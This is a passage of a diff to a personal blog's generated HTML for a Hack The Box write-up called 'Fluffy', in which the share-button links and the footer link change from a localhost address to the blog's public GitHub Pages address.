                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
@@ -564,7 +644,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on linkedin"
-            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f&amp;title=HTB%20-%20Fluffy&amp;summary=HTB%20-%20Fluffy&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f">
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f&amp;title=HTB%20-%20Fluffy&amp;summary=HTB%20-%20Fluffy&amp;source=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
@@ -573,7 +653,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on reddit"
-            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f&title=HTB%20-%20Fluffy">
+            href="https://reddit.com/submit?url=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f&title=HTB%20-%20Fluffy">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
@@ -582,7 +662,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on facebook"
-            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f">
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
@@ -591,7 +671,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on whatsapp"
-            href="https://api.whatsapp.com/send?text=HTB%20-%20Fluffy%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f">
+            href="https://api.whatsapp.com/send?text=HTB%20-%20Fluffy%20-%20https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
@@ -600,7 +680,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on telegram"
-            href="https://telegram.me/share/url?text=HTB%20-%20Fluffy&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f">
+            href="https://telegram.me/share/url?text=HTB%20-%20Fluffy&amp;url=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f">
             <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -609,7 +689,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on ycombinator"
-            href="https://news.ycombinator.com/submitlink?t=HTB%20-%20Fluffy&u=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fhtb-fluffy%2f">
+            href="https://news.ycombinator.com/submitlink?t=HTB%20-%20Fluffy&u=https%3a%2f%2fharunmansor.github.io%2fblog%2fposts%2fhtb-fluffy%2f">
             <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                 xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                 <path
@@ -624,7 +704,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/blog/">Harun Mansor</a></span> · 
+        <span>&copy; 2025 <a href="https://harunmansor.github.io/blog/">Harun Mansor</a></span> · 
 
     <span>
         Powered by
